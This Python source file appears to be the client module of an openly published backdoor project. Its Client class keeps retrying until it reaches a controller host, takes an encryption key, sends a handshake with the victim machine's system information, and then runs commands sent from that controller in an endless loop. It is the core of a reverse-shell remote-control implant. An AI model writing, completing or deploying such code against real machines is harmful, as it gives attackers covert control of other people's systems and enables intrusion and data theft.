"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import base64
import socket
import time
import logging

from src.definitions import platforms
from src.encryption import Encryption
from src.logger import LOGGER_ID

from src.client.control.control import get_info

if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
    from src.client.control.unix import Unix as Control
else:
    from src.client.control.windows import Windows as Control

from src.encrypted_socket import EncryptedSocket
from src.client.command_handler import CommandHandler
from src.definitions.commands import *


class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.es = EncryptedSocket(socket.socket(), None)
        self.logger = logging.getLogger(LOGGER_ID)

    def connect(self):
        while True:  # infinite loop until socket can connect
            try:
                self.es.socket.connect((self.host, self.port))
            except socket.error:
                time.sleep(3)  # wait 3 seconds to try again
            else:
                break

        # first message must always be the key as b64
        key = base64.b64decode(self.es.recv(False))
        self.es.encryptor = Encryption(key).fernet

        self.logger.debug(f"recv key: {key}")

        del key

        c = Control(self.es)

        # send handshake
        self.es.send_json(CLIENT_HANDSHAKE, get_info())

        ch = CommandHandler(c)

        while True:
            msg = self.es.recv_json()
            ch.parse(msg)
